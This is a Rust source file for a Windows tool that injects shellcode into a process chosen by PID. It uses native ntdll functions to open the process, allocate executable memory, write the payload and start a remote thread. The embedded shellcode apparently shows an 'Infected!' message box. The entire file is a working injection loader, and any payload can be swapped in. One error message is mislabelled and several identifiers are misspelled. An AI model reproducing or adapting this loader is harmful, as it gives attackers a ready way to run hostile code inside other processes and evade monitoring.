use std::{env, ffi::c_void, ptr};
use windows::Win32::Foundation::NTSTATUS;

type HANDLE = *mut c_void;

#[repr(C)]
#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
pub struct CLIENT_ID {
    UniqueProcess: *mut c_void,
    UniqueThread: *mut c_void,
}

#[repr(C)]
#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
pub struct OBJECT_ATTRIBUTES {
    Lenght: u32,
    RootDirectory: HANDLE,
    ObjectName: *mut c_void,
    Attributes: u32,
    SecurityDescriptor: *mut c_void,
    SecurityQualityOfService: *mut c_void,
}

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PROCESS_VM_OPERATION: u32 = 0x0008;
const PROCESS_VM_WRITE: u32 = 0x0020;
const PROCESS_CREATE_THREAD: u32 = 0x0002;
const PROCESS_QUERY_INFORMATION: u32 = 0x0400;

#[link(name = "ntdll")]
unsafe extern "system" {
    pub fn NtOpenProcess(
        ProcessHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ClientId: *mut CLIENT_ID,
    ) -> NTSTATUS;

    pub fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_address: *mut c_void,
        parameter: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> NTSTATUS;

    pub fn NtAllocateVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> NTSTATUS;

    pub fn NtWriteVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        BufferSize: usize,
        ReturnSize: *mut usize,
    ) -> NTSTATUS;

    pub fn NtWaitForSingleObject(Handle: HANDLE, Altertable: u8, Timeout: *mut i64) -> NTSTATUS;

    pub fn NtClose(Handle: HANDLE) -> NTSTATUS;
}

pub fn main() -> windows::core::Result<()> {
    unsafe {
        let mut args = env::args();
        let _bin = args.next();
        let pid_str = match args.next() {
            Some(pid_str) => pid_str,
            None => {
                println!("Usage : nt-basic <pid>");
                std::process::exit(1);
            }
        };
        let pid: u32 = match pid_str.parse() {
            Ok(n) => n,
            Err(_) => {
                println!("PID must be a u32");
                std::process::exit(1);
            }
        };
        let mut h_process: HANDLE = std::ptr::null_mut();
        let mut object_attributes = OBJECT_ATTRIBUTES {
            Lenght: size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: std::ptr::null_mut(),
            ObjectName: std::ptr::null_mut(),
            Attributes: 0,
            SecurityDescriptor: std::ptr::null_mut(),
            SecurityQualityOfService: std::ptr::null_mut(),
        };
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as usize as *mut c_void,
            UniqueThread: std::ptr::null_mut(),
        };
        let desired_access: u32 = PROCESS_VM_WRITE
            | PROCESS_CREATE_THREAD
            | PROCESS_VM_OPERATION
            | PROCESS_QUERY_INFORMATION;
        let openprocess_status = NtOpenProcess(
            &mut h_process as *mut HANDLE,
            desired_access,
            &mut object_attributes as *mut OBJECT_ATTRIBUTES,
            &mut client_id as *mut CLIENT_ID,
        );
        assert!(
            openprocess_status.0 == 0,
            "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
            openprocess_status.0
        );

        let shellcode: [u8; 316] = [
            0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41,
            0x51, 0x41, 0x50, 0x52, 0x51, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x56,
            0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48,
            0x8b, 0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
            0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51,
            0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18,
            0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49,
            0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41,
            0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac,
            0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39,
            0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
            0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41,
            0x58, 0x41, 0x58, 0x5e, 0x59, 0x48, 0x01, 0xd0, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41,
            0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
            0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75,
            0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x59, 0x41, 0xba, 0x4c,
            0x77, 0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x15,
            0x00, 0x00, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20,
            0x73, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x00, 0x5a, 0xe8, 0x0a, 0x00,
            0x00, 0x00, 0x49, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x00, 0x41, 0x58,
            0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9,
            0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5,
        ];
        let mut remote_addr: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = shellcode.len() as usize;

        let allocation_status = NtAllocateVirtualMemory(
            h_process,
            &mut remote_addr as *mut *mut c_void,
            0usize as usize,
            &mut region_size as *mut usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        assert!(
            allocation_status.0 == 0,
            "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
            allocation_status.0
        );
        let write_size: *mut usize = std::ptr::null_mut();
        let write_status = NtWriteVirtualMemory(
            h_process,
            remote_addr,
            shellcode.as_ptr() as *mut c_void,
            shellcode.len(),
            write_size,
        );
        assert!(
            write_status.0 == 0,
            "NtWrtieVirtualMemomry failed with NTSTATUS: 0x{:X}",
            write_status.0
        );

        let mut h_thread: HANDLE = std::ptr::null_mut();
        let status = NtCreateThreadEx(
            &mut h_thread,
            0x1FFFFF,
            ptr::null_mut(),
            h_process,
            remote_addr as *mut c_void,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
        );

        assert!(
            status.0 == 0,
            "NtCreateThreadEx failed with NTSTATUS: 0x{:X}",
            status.0
        );

        let wfso_status = NtWaitForSingleObject(h_thread, 0, ptr::null_mut());
        assert!(
            wfso_status.0 == 0,
            "NtWaitForSingleObject failed with NTSTATUS: 0x{:X}",
            wfso_status.0
        );
        let _ = NtClose(h_thread);
        let _ = NtClose(h_process);
        return Ok(());
    }
}
